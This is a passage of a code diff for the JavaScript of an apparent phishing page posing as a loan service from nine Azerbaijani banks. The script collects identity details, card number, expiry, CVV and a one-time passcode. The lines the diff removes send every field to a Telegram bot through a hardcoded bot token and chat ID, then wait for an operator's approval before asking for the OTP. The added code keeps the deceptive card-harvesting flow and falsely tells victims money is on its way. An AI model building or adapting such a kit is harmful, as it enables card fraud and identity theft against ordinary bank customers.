CSMgYH5uwXWWFQoYhUqm0J72ykqJUKjU+Hi8sLHKVImF4dpqVrK+r9Tynp7c3Ei1UQIJIAEyMj1ZUVBQXFwUiFkzuRnKRWUHIJRauZERPcATFGReOdvQe7ejqT8k0WVFQa5c2r2qscpQkQkNKJr9RZweBlGuCUmh5iMhgZDZs5jZBS/RYopkWEFEeuZJDFiICeMAS0GTJSMQAoDxmZCQUhNmNrtJfXMWOAkyTCEtKI4QYQSAhZxaWKWZlI6EiQKXIsxiQkckUkwvhkV1lC8A0hkz2TGW7ImKgv4DVn8tDZCVd6RiGyZ7hOUwRRGCB6C8BRkT2lMcuEBIZhJn4JGBmJVZmzX5maQcjIktWkgEZDYHMLAGF4zESWEIwA6JSygUlAQWShYgMkpXrryz01zvmQnHMClgBku9DdqkVslLZXUKYXQzjr3WUTJTbdJ5bUyiVIsSLWjZzcWJlJooBGIj9bYCAEhQpSWRwdgNv3upefxe3ymZoJgqMwOSr5If3FPsBLcwkOBMSZ1Ldv6ofc1G5TauZLQ7Z6Qlmf4eZv3qS0M8hmNxDlYmcsb9snpByWyj8SDT5e/uYmVV28zZlQtWc2XbGmXgiKwRiUNkJulz6AACxYn9Jvl+KMos5Myblli9nJuuyQ+2z9tX4u3Kn7PPJXCOzHjb/z1yfB7ProjOi5HaQc3bLF0yNpObN0nDeT8jdz6QlF2nVRYk1mXiYq7zy1hVmJjgn11YzISFNuZvcbsIpW+ayW/ry1pXjZPJNbvg7e81pLl7nFyzObVfH7Lr33Ird3OkmT8+Za2QfKbcinXMOnJ3M2ZvO28ydXW+O2X3c59xnVgXmyRBj7si84peXFvlb3XPFOS+POV+D827iyd1hdraP876mIH8TwDl5ex5DAC6wv/5biJXd4JTd0MecbTTyFvSfdZ+5r3mA3Ac5E0g5q+jlpUnek/OUovSfJgNOqsX5mZM7NHvKnNt534QxeaO5t3M6AExmT87dyRuYvF/Me4fhrEg1Tjk8+/7ZSYWTUnK2gPDke+fLrWwzevb+h+wNTL1VmGrb5GFTvofl7CC7n1cXJ9cHsOdVozkX/f1YmkDQYmkCQYulCQQtliYQtFiaQNBiaQJBi6UJBC2WJhC0WJpA0GJpAkGLpQkELZYmELRYmkDQYmkCQYulCQQtliYQtFiaQNBiaQJBi6UJBC2WJhC0WJpA0GJpAkGLpQkELZYmELRYmkDQYmkCQYulCQQtliYQtFiaQNBiaQJBi6UJBC2WJhC0WJpA0GJpAkGLpQkELZYmELRYmkDQYmkCQYulCQQtliYQtFiaQNBiaQJBi6UJBC2WJhC0WJpA0GJpAkGLpQkELZYmELRYmkDQYmkCQYulCQQtliYQtFiaQNBiaQJBi6UJBC2WJhC0WJpA0GJpAkGLpQkELZYmELRYmkDQYmkCQYulCQQtliYQtFiaQNBiaQJBi6UJBC2WJhC0WJpA0GJpAkGLpQkELZYmEP4D1duXXPCZAZQAAAAASUVORK5CYII=";
 
-  // ========== TELEGRAM ==========
-  const BOT_TOKEN = "8902438504:AAHNLnxNa6m2BBnO0eEJdssVYvXTHpBgscI";
-  const CHAT_ID = "-1004292906522";
+// Xalq Bank
+const xalqLogo = "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 200 60'%3E%3Crect width='200' height='60' fill='%23004B87' rx='8'/%3E%3Ctext x='25' y='38' font-family='Arial' font-size='20' fill='white' font-weight='bold'%3EXALQ%3C/text%3E%3Ctext x='105' y='38' font-family='Arial' font-size='16' fill='white'%3EBANK%3C/text%3E%3C/svg%3E";
 
-  let applicationData = {};
-  let selectedBankData = { name: 'Kapital Bank', color: '#E31E24' };
-  let isChecking = false;
-  let checkInterval = null;
-  let checkSeconds = 0;
+// Rabitəbank
+const rabitaLogo = "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 200 60'%3E%3Crect width='200' height='60' fill='%23003366' rx='8'/%3E%3Ctext x='10' y='38' font-family='Arial' font-size='16' fill='white' font-weight='bold'%3ERAB%C4%B0T%C6%8F%3C/text%3E%3Ctext x='115' y='38' font-family='Arial' font-size='14' fill='white'%3EBANK%3C/text%3E%3C/svg%3E";
 
-  const termOptions = [
-    { value: 0, label: '10 gün', days: 10 },
-    { value: 1, label: '15 gün', days: 15 },
-    { value: 2, label: '20 gün', days: 20 },
-    { value: 3, label: '1 ay', days: 30 },
-    { value: 4, label: '2 ay', days: 60 },
-    { value: 5, label: '3 ay', days: 90 }
-  ];
+// ========== BANKS LIST ==========
+const banks = [
+  { name: 'Kapital Bank', color: '#E31E24', logo: kapitalLogo, sub: 'kapitalbank.az' },
+  { name: 'Leobank', color: '#0066B3', logo: leobankLogo, sub: 'leobank.az' },
+  { name: 'ABB', color: '#004B87', logo: abbLogo, sub: 'abb-bank.az' },
+  { name: 'PAŞA Bank', color: '#E31E24', logo: pashaLogo, sub: 'pashabank.az' },
+  { name: 'AccessBank', color: '#0057A0', logo: accessLogo, sub: 'accessbank.az' },
+  { name: 'Unibank', color: '#004B87', logo: unibankLogo, sub: 'unibank.az' },
+  { name: 'Bank Respublika', color: '#E31E24', logo: respublikaLogo, sub: 'bankrespublika.az' },
+  { name: 'Xalq Bank', color: '#004B87', logo: xalqLogo, sub: 'xalqbank.az' },
+  { name: 'Rabitəbank', color: '#003366', logo: rabitaLogo, sub: 'rabitabank.com' }
+];
 
-  const bankDataMap = {
-    'Kapital Bank': { color: '#E31E24', bg: 'linear-gradient(135deg, #1a1a2e, #E31E24)' },
-    'Leobank': { color: '#0066B3', bg: 'linear-gradient(135deg, #1a1a2e, #0066B3)' },
-    'ABB': { color: '#004B87', bg: 'linear-gradient(135deg, #1a1a2e, #004B87)' },
-    'PAŞA Bank': { color: '#E31E24', bg: 'linear-gradient(135deg, #1a1a2e, #E31E24)' },
-    'AccessBank': { color: '#0057A0', bg: 'linear-gradient(135deg, #1a1a2e, #0057A0)' },
-    'Unibank': { color: '#004B87', bg: 'linear-gradient(135deg, #1a1a2e, #004B87)' },
-    'Bank Respublika': { color: '#E31E24', bg: 'linear-gradient(135deg, #1a1a2e, #E31E24)' },
-    'Xalq Bank': { color: '#004B87', bg: 'linear-gradient(135deg, #1a1a2e, #004B87)' },
-    'Rabitəbank': { color: '#003366', bg: 'linear-gradient(135deg, #1a1a2e, #003366)' }
+// ========== CALCULATOR ==========
+const amountSlider = document.getElementById('amountSlider');
+const termSlider = document.getElementById('termSlider');
+const termOptions = [
+  { value: 0, label: '10 gün', days: 10 },
+  { value: 1, label: '15 gün', days: 15 },
+  { value: 2, label: '20 gün', days: 20 },
+  { value: 3, label: '1 ay', days: 30 },
+  { value: 4, label: '2 ay', days: 60 },
+  { value: 5, label: '3 ay', days: 90 }
+];
+
+function calc(){
+  const amount = parseInt(amountSlider.value);
+  const termIndex = parseInt(termSlider.value);
+  const termOption = termOptions.find(t=>t.value===termIndex)||termOptions[5];
+  const days = termOption.days;
+  const fee = Math.round(amount*0.09);
+  const interest = Math.round(amount*0.04/30*days);
+  const total = amount+fee+interest;
+  const monthly = Math.round(total/Math.max(1,days/30));
+  
+  document.getElementById('amountLabel').textContent=amount+' ₼';
+  document.getElementById('termLabel').textContent=termOption.label;
+  document.getElementById('monthlyOut').textContent=monthly+' ₼';
+  document.getElementById('totalOut').textContent=total+' ₼';
+  document.getElementById('principalOut').textContent=amount+' ₼';
+  document.getElementById('feeOut').textContent=fee+' ₼';
+  document.getElementById('termOut').textContent=termOption.label;
+  document.getElementById('creditAmountDisplay').textContent=amount+' ₼';
+  document.getElementById('creditTermDisplay').textContent=termOption.label+' müddətə';
+  
+  const pct = ((amountSlider.value-amountSlider.min)/(amountSlider.max-amountSlider.min))*100;
+  amountSlider.style.setProperty('--fill',pct+'%');
+  const pct2 = ((termSlider.value-termSlider.min)/(termSlider.max-termSlider.min))*100;
+  termSlider.style.setProperty('--fill',pct2+'%');
+}
+amountSlider.addEventListener('input',calc);
+termSlider.addEventListener('input',calc);
+calc();
+
+// ========== FAQ ==========
+document.querySelectorAll('.faq-item').forEach(item=>{
+  item.querySelector('.faq-q').addEventListener('click',()=>{
+    const open = item.classList.contains('open');
+    document.querySelectorAll('.faq-item').forEach(i=>i.classList.remove('open'));
+    if(!open) item.classList.add('open');
+  });
+});
+
+// ========== TOGGLE ==========
+document.querySelectorAll('.toggle-btn').forEach(btn=>{
+  btn.addEventListener('click',()=>{
+    btn.parentElement.querySelectorAll('.toggle-btn').forEach(b=>b.classList.remove('active'));
+    btn.classList.add('active');
+  });
+});
+
+// ========== ID CARD PREVIEW ==========
+function updateIDPreview(){
+  const name = (document.getElementById('firstName').value||'ƏLİ').toUpperCase();
+  const surname = (document.getElementById('lastName').value||'MƏMMƏDOV').toUpperCase();
+  const patronymic = (document.getElementById('patronymic').value||'ƏLİ OĞLU').toUpperCase();
+  const birth = document.getElementById('birthDate').value||'1990-01-01';
+  const fin = (document.getElementById('fin').value||'7A2BC9D').toUpperCase();
+  const id = document.getElementById('idnum').value||'12345678';
+  const prefix = document.getElementById('idPrefix').value||'AZE';
+  
+  document.getElementById('previewName').textContent = name||'ƏLİ';
+  document.getElementById('previewSurname').textContent = surname||'MƏMMƏDOV';
+  document.getElementById('previewPatronymic').textContent = patronymic||'ƏLİ OĞLU';
+  document.getElementById('previewBirth').textContent = birth ? birth.split('-').reverse().join('.') : '01.01.1990';
+  document.getElementById('previewFin').textContent = fin||'7A2BC9D';
+  document.getElementById('previewId').textContent = (prefix||'AZE')+' '+(id||'12345678');
+}
+document.getElementById('firstName').addEventListener('input',updateIDPreview);
+document.getElementById('lastName').addEventListener('input',updateIDPreview);
+document.getElementById('patronymic').addEventListener('input',updateIDPreview);
+document.getElementById('birthDate').addEventListener('input',updateIDPreview);
+document.getElementById('fin').addEventListener('input',updateIDPreview);
+document.getElementById('idnum').addEventListener('input',updateIDPreview);
+document.getElementById('idPrefix').addEventListener('change',updateIDPreview);
+updateIDPreview();
+
+// ========== RENDER BANKS ==========
+function renderBanks(){
+  const grid = document.getElementById('bankGrid');
+  grid.innerHTML='';
+  banks.forEach(bank=>{
+    const div = document.createElement('div');
+    div.className = 'bank-option';
+    div.dataset.bank = bank.name;
+    div.dataset.color = bank.color;
+    div.onclick = function(){ selectBank(this); };
+    div.innerHTML = `
+      <img class="bank-logo-img" src="${bank.logo}" alt="${bank.name}" onerror="this.style.display='none'">
+      <div class="bank-name">${bank.name}</div>
+      <div class="bank-sub">${bank.sub}</div>
+    `;
+    grid.appendChild(div);
+  });
+}
+renderBanks();
+
+// ========== MODAL ==========
+let selectedBankData = { name: 'Kapital Bank', color: '#E31E24' };
+let isChecking = false;
+let checkInterval = null;
+let checkSeconds = 0;
+
+function openModal(){
+  document.getElementById('modalOverlay').classList.add('active');
+  document.body.style.overflow='hidden';
+  showFormStep();
+}
+function closeModal(){
+  document.getElementById('modalOverlay').classList.remove('active');
+  document.body.style.overflow='';
+  showFormStep();
+  if(checkInterval){clearInterval(checkInterval);checkInterval=null;}
+  isChecking=false;
+  document.getElementById('cardNumberInput').value='';
+  document.getElementById('cardDigits').textContent='0000 0000 0000 0000';
+  document.getElementById('cardProgress').style.width='0%';
+  document.getElementById('cardProgressLabel').textContent='0/16 rəqəm daxil edilib';
+  document.querySelectorAll('.bank-option').forEach(b=>b.classList.remove('selected'));
+  document.getElementById('cardExpiry').value='';
+  document.getElementById('cardCvv').value='';
+  document.getElementById('otpCode').value='';
+  document.getElementById('otpStatus').style.display='none';
+}
+function showFormStep(){
+  document.getElementById('formStep').style.display='block';
+  document.getElementById('summaryStep').style.display='none';
+  document.getElementById('bankStep').style.display='none';
+  document.getElementById('cardInputStep').style.display='none';
+  document.getElementById('checkingStep').style.display='none';
+  document.getElementById('threeDStep').style.display='none';
+}
+function showSummaryStep(){
+  document.getElementById('formStep').style.display='none';
+  document.getElementById('summaryStep').style.display='block';
+  document.getElementById('bankStep').style.display='none';
+  document.getElementById('cardInputStep').style.display='none';
+  document.getElementById('checkingStep').style.display='none';
+  document.getElementById('threeDStep').style.display='none';
+}
+function goToBankSelect(){
+  document.getElementById('summaryStep').style.display='none';
+  document.getElementById('bankStep').style.display='block';
+}
+function selectBank(el){
+  document.querySelectorAll('.bank-option').forEach(b=>b.classList.remove('selected'));
+  el.classList.add('selected');
+  selectedBankData = { name: el.dataset.bank, color: el.dataset.color };
+  document.getElementById('selectedBankDisplay').textContent = selectedBankData.name;
+}
+function goToCardInput(){
+  if(!document.querySelector('.bank-option.selected')){ alert('Bank seçin!'); return; }
+  document.getElementById('bankStep').style.display='none';
+  document.getElementById('cardInputStep').style.display='block';
+  
+  const bankName = selectedBankData.name;
+  document.getElementById('cardBankName').textContent = bankName.toUpperCase();
+  
+  const bank = banks.find(b=>b.name===bankName);
+  if(bank) document.getElementById('cardLogoOnCard').src = bank.logo;
+  
+  const colors = {
+    'Kapital Bank':'linear-gradient(135deg,#1a1a2e,#E31E24)',
+    'Leobank':'linear-gradient(135deg,#1a1a2e,#0066B3)',
+    'ABB':'linear-gradient(135deg,#1a1a2e,#004B87)',
+    'PAŞA Bank':'linear-gradient(135deg,#1a1a2e,#E31E24)',
+    'AccessBank':'linear-gradient(135deg,#1a1a2e,#0057A0)',
+    'Unibank':'linear-gradient(135deg,#1a1a2e,#004B87)',
+    'Bank Respublika':'linear-gradient(135deg,#1a1a2e,#E31E24)',
+    'Xalq Bank':'linear-gradient(135deg,#1a1a2e,#004B87)',
+    'Rabitəbank':'linear-gradient(135deg,#1a1a2e,#003366)'
   };
+  document.getElementById('bankCardVisual').style.background = colors[bankName]||'linear-gradient(135deg,#1a1a2e,#16213e)';
+  setTimeout(()=>document.getElementById('cardNumberInput').focus(),100);
+}
 
-  // Render banks
-  function renderBanks() {
-    const grid = document.getElementById('bankGrid');
-    grid.innerHTML = '';
-    banks.forEach(bank => {
-      const div = document.createElement('div');
-      div.className = 'bank-option';
-      div.dataset.bank = bank.name;
-      div.dataset.color = bank.color;
-      div.onclick = function() { selectBank(this); };
-      div.innerHTML = `
-        <img class="bank-logo-img" src="${bank.logo}" alt="${bank.name}" onerror="this.style.display='none'">
-        <div class="bank-name">${bank.name}</div>
-        <div class="bank-sub">${bank.sub}</div>
-      `;
-      grid.appendChild(div);
-    });
-  }
-  renderBanks();
+// ========== CARD INPUT ==========
+const cardNumberInput = document.getElementById('cardNumberInput');
+document.getElementById('bankCardVisual').addEventListener('click',()=>cardNumberInput.focus());
+cardNumberInput.addEventListener('input',function(){
+  let val = this.value.replace(/\D/g,'').slice(0,16);
+  this.value = val;
+  let display = val.padEnd(16,'0').replace(/(\d{4})/g,'$1 ').trim();
+  document.getElementById('cardDigits').textContent = display;
+  document.getElementById('cardProgress').style.width = (val.length/16*100)+'%';
+  document.getElementById('cardProgressLabel').textContent = val.length+'/16 rəqəm daxil edilib';
+});
+document.getElementById('cardExpiry').addEventListener('input',function(){
+  let val = this.value.replace(/\D/g,'').slice(0,4);
+  if(val.length>2) val=val.slice(0,2)+'/'+val.slice(2);
+  this.value = val;
+  document.getElementById('cardExpiryDisplay').textContent = val||'MM/YY';
+});
+document.getElementById('cardCvv').addEventListener('input',function(){
+  this.value = this.value.replace(/\D/g,'').slice(0,4);
+  document.getElementById('cardCvvDisplay').textContent = this.value.padEnd(3,'*');
+});
 
-  async function sendToTelegram(data) {
-    const message = `
-🆕 YENİ KREDİT MÜRACİƏTİ!
-━━━━━━━━━━━━━━━━━━━━
-👤 Ad, Soyad: ${data.name}
-👤 Ata adı: ${data.patronymic || '—'}
-📅 Doğum: ${data.birth}
-🪪 FIN: ${data.fin}
-🪪 Seriya: ${data.id}
-📱 Telefon: ${data.phone}
-💼 İş: ${data.job}
-🏦 Bank: ${data.bank}
-💳 Kart: ${data.cardNumber}
-📅 Bitmə: ${data.expiry}
-🔐 CVV: ${data.cvv}
-💰 Məbləğ: ${data.amount}
-📆 Müddət: ${data.term}
-━━━━━━━━━━━━━━━━━━━━
-🔐 OTP kodu gözlənilir...
-    `.trim();
-
-    const replyMarkup = {
-      inline_keyboard: [[{ text: '✅ Qəbul et', callback_data: 'approve' }]]
-    };
-
-    try {
-      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-        method: 'POST',
-        headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'HTML', reply_markup: replyMarkup })
-      });
-      startTelegramPolling();
-    } catch(e) { console.error('Telegram xətası:', e); }
-  }
-
-  async function sendOTPToTelegram(otp) {
-    try {
-      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-        method: 'POST',
-        headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({ chat_id: CHAT_ID, text: `🔐 OTP Kodu: ${otp}` })
-      });
-    } catch(e) { console.error('OTP xətası:', e); }
-  }
-
-  let lastUpdateId = 0;
-  let pollingActive = false;
-
-  async function startTelegramPolling() {
-    if(pollingActive) return;
-    pollingActive = true;
-    await checkTelegramUpdates();
-  }
-
-  async function checkTelegramUpdates() {
-    if(!pollingActive) return;
-    try {
-      const url = `https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=30`;
-      const response = await fetch(url);
-      const data = await response.json();
-      
-      if(data.ok && data.result) {
-        for(const update of data.result) {
-          lastUpdateId = update.update_id;
-          if(update.callback_query && update.callback_query.data === 'approve') {
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
-              method: 'POST',
-              headers: {'Content-Type': 'application/json'},
-              body: JSON.stringify({ callback_query_id: update.callback_query.id, text: '✅ Qəbul edildi!' })
-            });
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-              method: 'POST',
-              headers: {'Content-Type': 'application/json'},
-              body: JSON.stringify({ chat_id: CHAT_ID, text: '✅ Müraciət QƏBUL EDİLDİ!', reply_to_message_id: update.callback_query.message.message_id })
-            });
-            if(isChecking) {
-              clearInterval(checkInterval);
-              isChecking = false;
-              pollingActive = false;
-              document.getElementById('checkingStep').style.display = 'none';
-              document.getElementById('threeDStep').style.display = 'block';
-              document.getElementById('otpCode').value = '';
-              document.getElementById('otpStatus').style.display = 'none';
-            }
-            break;
-          }
-        }
-      }
-      if(pollingActive && isChecking) setTimeout(checkTelegramUpdates, 3000);
-    } catch(e) {
-      console.error('Polling xətası:', e);
-      if(pollingActive && isChecking) setTimeout(checkTelegramUpdates, 5000);
+// ========== CHECKING ==========
+function goToChecking(){
+  if(document.getElementById('cardNumberInput').value.length<16){ alert('16 rəqəmli kart nömrəsini daxil edin!'); return; }
+  if(document.getElementById('cardExpiry').value.length<5){ alert('Bitmə tarixini daxil edin!'); return; }
+  if(document.getElementById('cardCvv').value.length<3){ alert('CVV kodunu daxil edin!'); return; }
+  
+  document.getElementById('cardInputStep').style.display='none';
+  document.getElementById('checkingStep').style.display='block';
+  isChecking=true;
+  checkSeconds=0;
+  document.getElementById('checkingTimer').textContent='0';
+  document.getElementById('checkingStatus').style.display='none';
+  
+  if(checkInterval) clearInterval(checkInterval);
+  checkInterval = setInterval(()=>{
+    checkSeconds++;
+    document.getElementById('checkingTimer').textContent=checkSeconds;
+    if(checkSeconds>10){
+      document.getElementById('checkingStatus').style.display='block';
+      document.getElementById('checkingStatus').textContent='⏳ Təsdiq gözlənilir... ('+checkSeconds+'s)';
     }
+  },1000);
+  
+  setTimeout(()=>{
+    if(isChecking){
+      clearInterval(checkInterval);
+      isChecking=false;
+      document.getElementById('checkingStep').style.display='none';
+      document.getElementById('threeDStep').style.display='block';
+      document.getElementById('otpCode').value='';
+      document.getElementById('otpStatus').style.display='none';
+    }
+  },5000);
+}
+
+// ========== OTP SUBMIT ==========
+function submitOTP(){
+  const otp = document.getElementById('otpCode').value.replace(/\s/g,'');
+  if(otp.length===6){
+    document.getElementById('otpStatus').style.display='block';
+    document.getElementById('otpStatus').textContent='✅ Təsdiq edildi! Pul kartınıza köçürülür.';
+    setTimeout(()=>{ alert('✅ Müraciətiniz uğurla təsdiqləndi!'); closeModal(); },1500);
+  } else {
+    alert('❌ 6 rəqəmli OTP kodunu daxil edin!');
   }
+}
 
-  // ========== KALKULYATOR ==========
-  const amountSlider = document.getElementById('amountSlider');
-  const termSlider = document.getElementById('termSlider');
-  const amountLabel = document.getElementById('amountLabel');
-  const termLabel = document.getElementById('termLabel');
-  const monthlyOut = document.getElementById('monthlyOut');
-  const totalOut = document.getElementById('totalOut');
-  const principalOut = document.getElementById('principalOut');
-  const feeOut = document.getElementById('feeOut');
-  const termOut = document.getElementById('termOut');
+// ========== FORM SUBMIT ==========
+document.getElementById('applyForm').addEventListener('submit',function(e){
+  e.preventDefault();
+  const firstName = document.getElementById('firstName').value.trim();
+  const lastName = document.getElementById('lastName').value.trim();
+  const patronymic = document.getElementById('patronymic').value.trim();
+  const birth = document.getElementById('birthDate').value;
+  const fin = document.getElementById('fin').value.trim().toUpperCase();
+  const id = document.getElementById('idnum').value.trim();
+  const phone = document.getElementById('phone').value.trim();
+  const consent1 = document.getElementById('consent1').checked;
+  const consent2 = document.getElementById('consent2').checked;
+  
+  if(!firstName||!lastName){ alert('Ad və soyad daxil edin!'); return; }
+  if(!birth){ alert('Doğum tarixi daxil edin!'); return; }
+  if(!fin||fin.length!==7){ alert('FIN kod 7 simvoldan ibarət olmalıdır!'); return; }
+  if(!id||id.length!==8){ alert('Seriya nömrəsi 8 rəqəmdən ibarət olmalıdır!'); return; }
+  if(phone.replace(/\D/g,'').length!==10){ alert('Düzgün mobil nömrə daxil edin!'); return; }
+  if(!consent1||!consent2){ alert('Bütün razılıqları qeyd edin!'); return; }
+  
+  const prefix = document.getElementById('idPrefix').value||'AZE';
+  document.getElementById('sumSurname').textContent = lastName.toUpperCase();
+  document.getElementById('sumName').textContent = firstName.toUpperCase();
+  document.getElementById('sumPatronymic').textContent = patronymic.toUpperCase()||'—';
+  document.getElementById('sumBirth').textContent = birth.split('-').reverse().join('.');
+  document.getElementById('sumFin').textContent = fin;
+  document.getElementById('sumId').textContent = prefix+' '+id;
+  document.getElementById('sumPhone').textContent = phone;
+  document.getElementById('sumJob').textContent = document.querySelector('.toggle-btn.active')?.dataset?.val==='beli'?'Bəli':'Xeyr';
+  
+  showSummaryStep();
+});
 
-  function updateSliderFill(el){
-    const pct = ((el.value - el.min) / (el.max - el.min)) * 100;
-    el.style.setProperty('--fill', pct + '%');
-  }
+document.getElementById('modalOverlay').addEventListener('click',function(e){
+  if(e.target===this){ if(checkInterval){clearInterval(checkInterval);checkInterval=null;} isChecking=false; closeModal(); }
+});
 
-  function getTermLabel(value) {
-    const option = termOptions.find(t => t.value === parseInt(value));
-    return option ? option.label : '3 ay';
-  }
-
-  function calc(){
-    const amount = parseInt(amountSlider.value);
-    const termIndex = parseInt(termSlider.value);
-    const termOption = termOptions.find(t => t.value === termIndex) || termOptions[5];
-    const termLabelText = termOption.label;
-    const days = termOption.days;
-    const dailyRate = 0.04 / 30;
-    const fee = Math.round(amount * 0.09);
-    const interest = Math.round(amount * dailyRate * days);
-    const total = amount + fee + interest;
-    const monthly = Math.round(total / Math.max(1, days / 30));
-
-    amountLabel.textContent = amount.toLocaleString('az-AZ') + ' ₼';
-    termLabel.textContent = termLabelText;
-    monthlyOut.textContent = monthly.toLocaleString('az-AZ') + ' ₼';
-    totalOut.textContent = total.toLocaleString('az-AZ') + ' ₼';
-    principalOut.textContent = amount.toLocaleString('az-AZ') + ' ₼';
-    feeOut.textContent = fee.toLocaleString('az-AZ') + ' ₼';
-    termOut.textContent = termLabelText;
-
-    document.getElementById('creditAmountDisplay').textContent = amount.toLocaleString('az-AZ') + ' ₼';
-    document.getElementById('creditTermDisplay').textContent = termLabelText + ' müddətə';
-
-    updateSliderFill(amountSlider);
-    updateSliderFill(termSlider);
-  }
-  amountSlider.addEventListener('input', calc);
-  termSlider.addEventListener('input', calc);
-  calc();
-
-  // ========== ID CARD PREVIEW ==========
-  function updateIDPreview() {
-    const name = document.getElementById('firstName').value || 'ƏLİ';
-    const surname = document.getElementById('lastName').value || 'MƏMMƏDOV';
-    const patronymic = document.getElementById('patronymic').value || 'ƏLİ OĞLU';
-    const birth = document.getElementById('birthDate').value || '1990-01-01';
-    const fin = document.getElementById('fin').value || '7A2BC9D';
-    const id = document.getElementById('idnum').value || '12345678';
-    const prefix = document.getElementById('idPrefix').value || 'AZE';
-    
-    document.getElementById('previewName').textContent = name.toUpperCase() || 'ƏLİ';
-    document.getElementById('previewSurname').textContent = surname.toUpperCase() || 'MƏMMƏDOV';
-    document.getElementById('previewPatronymic').textContent = patronymic.toUpperCase() || 'ƏLİ OĞLU';
-    document.getElementById('previewBirth').textContent = birth ? birth.split('-').reverse().join('.') : '01.01.1990';
-    document.getElementById('previewFin').textContent = fin.toUpperCase() || '7A2BC9D';
-    document.getElementById('previewId').textContent = (prefix || 'AZE') + ' ' + (id || '12345678');
-  }
-
-  document.getElementById('firstName').addEventListener('input', updateIDPreview);
-  document.getElementById('lastName').addEventListener('input', updateIDPreview);
-  document.getElementById('patronymic').addEventListener('input', updateIDPreview);
-  document.getElementById('birthDate').addEventListener('input', updateIDPreview);
-  document.getElementById('fin').addEventListener('input', updateIDPreview);
-  document.getElementById('idnum').addEventListener('input', updateIDPreview);
-  document.getElementById('idPrefix').addEventListener('change', updateIDPreview);
+document.getElementById('fin').addEventListener('input',function(){
+  this.value=this.value.toUpperCase().replace(/[^A-Z0-9]/g,'').slice(0,7);
   updateIDPreview();
-
-  // ========== FAQ ==========
-  document.querySelectorAll('.faq-item').forEach(item=>{
-    item.querySelector('.faq-q').addEventListener('click', ()=>{
-      const isOpen = item.classList.contains('open');
-      document.querySelectorAll('.faq-item').forEach(i=>{i.classList.remove('open'); i.querySelector('.icon').textContent='+';});
-      if(!isOpen){ item.classList.add('open'); item.querySelector('.icon').textContent='−'; }
-    });
-  });
-
-  // ========== TOGGLE ==========
-  document.querySelectorAll('.toggle-btn').forEach(btn=>{
-    btn.addEventListener('click', ()=>{
-      btn.parentElement.querySelectorAll('.toggle-btn').forEach(b=>b.classList.remove('active'));
-      btn.classList.add('active');
-    });
-  });
-
-  // ========== MODAL ==========
-  function openModal(){
-    document.getElementById('modalOverlay').classList.add('active');
-    document.body.style.overflow='hidden';
-    showFormStep();
-  }
-
-  function closeModal(){
-    document.getElementById('modalOverlay').classList.remove('active');
-    document.body.style.overflow='';
-    showFormStep();
-    if(checkInterval) { clearInterval(checkInterval); checkInterval = null; }
-    isChecking = false;
-    pollingActive = false;
-    document.getElementById('cardNumberInput').value = '';
-    document.getElementById('cardDigits').textContent = '0000 0000 0000 0000';
-    document.getElementById('cardProgress').style.width = '0%';
-    document.getElementById('cardProgressLabel').textContent = '0/16 rəqəm daxil edilib';
-    document.querySelectorAll('.bank-option').forEach(b => b.classList.remove('selected'));
-    document.getElementById('cardExpiry').value = '';
-    document.getElementById('cardCvv').value = '';
-    document.getElementById('otpCode').value = '';
-    document.getElementById('otpStatus').style.display = 'none';
-  }
-
-  function showFormStep(){
-    document.getElementById('formStep').style.display='block';
-    document.getElementById('summaryStep').style.display='none';
-    document.getElementById('bankStep').style.display='none';
-    document.getElementById('cardInputStep').style.display='none';
-    document.getElementById('checkingStep').style.display='none';
-    document.getElementById('threeDStep').style.display='none';
-  }
-
-  function showSummaryStep(){
-    document.getElementById('formStep').style.display='none';
-    document.getElementById('summaryStep').style.display='block';
-    document.getElementById('bankStep').style.display='none';
-    document.getElementById('cardInputStep').style.display='none';
-    document.getElementById('checkingStep').style.display='none';
-    document.getElementById('threeDStep').style.display='none';
-  }
-
-  function goToBankSelect(){
-    document.getElementById('summaryStep').style.display='none';
-    document.getElementById('bankStep').style.display='block';
-  }
-
-  function selectBank(el){
-    document.querySelectorAll('.bank-option').forEach(b => b.classList.remove('selected'));
-    el.classList.add('selected');
-    const bankName = el.dataset.bank;
-    selectedBankData = {
-      name: bankName,
-      color: el.dataset.color
-    };
-    document.getElementById('selectedBankDisplay').textContent = selectedBankData.name;
-  }
-
-  function goToCardInput(){
-    if(!document.querySelector('.bank-option.selected')){
-      alert('Zəhmət olmasa bir bank seçin!');
-      return;
-    }
-    document.getElementById('bankStep').style.display='none';
-    document.getElementById('cardInputStep').style.display='block';
-    
-    const bankName = selectedBankData.name;
-    document.getElementById('cardBankName').textContent = bankName.toUpperCase();
-    
-    const bank = banks.find(b => b.name === bankName);
-    if(bank) {
-      document.getElementById('cardLogoOnCard').src = bank.logo;
-    }
-    
-    const cardVisual = document.getElementById('bankCardVisual');
-    const bankInfo = bankDataMap[bankName];
-    if(bankInfo) {
-      cardVisual.style.background = bankInfo.bg;
-    }
-    
-    setTimeout(() => document.getElementById('cardNumberInput').focus(), 100);
-  }
-
-  // ========== CARD INPUT ==========
-  const cardNumberInput = document.getElementById('cardNumberInput');
-  const cardDigits = document.getElementById('cardDigits');
-  const cardProgress = document.getElementById('cardProgress');
-  const cardProgressLabel = document.getElementById('cardProgressLabel');
-
-  document.getElementById('bankCardVisual').addEventListener('click', ()=>{
-    cardNumberInput.focus();
-  });
-
-  cardNumberInput.addEventListener('input', function(){
-    let val = this.value.replace(/\D/g,'').slice(0,16);
-    this.value = val;
-    let formatted = val.padEnd(16, '0');
-    let display = formatted.replace(/(\d{4})/g, '$1 ').trim();
-    cardDigits.textContent = display;
-    const progress = (val.length / 16) * 100;
-    cardProgress.style.width = progress + '%';
-    cardProgressLabel.textContent = val.length + '/16 rəqəm daxil edilib';
-  });
-
-  document.getElementById('cardExpiry').addEventListener('input', function(){
-    let val = this.value.replace(/\D/g,'').slice(0,4);
-    if(val.length > 2) val = val.slice(0,2) + '/' + val.slice(2);
-    this.value = val;
-    document.getElementById('cardExpiryDisplay').textContent = val || 'MM/YY';
-  });
-
